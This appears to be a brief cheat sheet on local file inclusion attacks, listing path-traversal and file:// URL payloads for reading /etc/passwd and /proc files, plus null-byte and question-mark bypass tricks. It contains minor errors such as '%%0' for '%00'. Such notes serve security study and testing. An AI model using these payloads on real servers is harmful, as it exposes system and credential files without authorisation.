LFI (Local File Injection)

- Manipulating local files (writing, modifying, reading).

If there is a parameter in a URL like `page=<file>`, we can try to read various system files:

Examples:
- `page=../../../../etc/passwd` -> Attempts to read the `/etc/passwd` file.
- `page=..//..//..//..//etc/passwd` -> Alternative path traversal attempt.
- `page=file:///etc/passwd` -> Directly specifies the file protocol to read the file.

Other useful file paths:
- `page=file:///proc/version` -> Provides version information of the system.
- `page=file:///proc/net/arp` -> Displays the ARP table.
- `page=file:///proc/sched_debug` -> Displays scheduled tasks.

If access to a file is restricted, you can try:
- `page=index.html` -> If access is denied, nothing will be displayed.

To bypass simple restrictions:
- `page=index.html%%0` -> `%00` (null byte) can be used to escape the restricted path.
- `page=index.html?` -> A question mark can also be used to attempt bypassing restrictions.

These methods exploit directory traversal and path manipulation to access sensitive files on the server, which may reveal valuable information or enable further attacks.
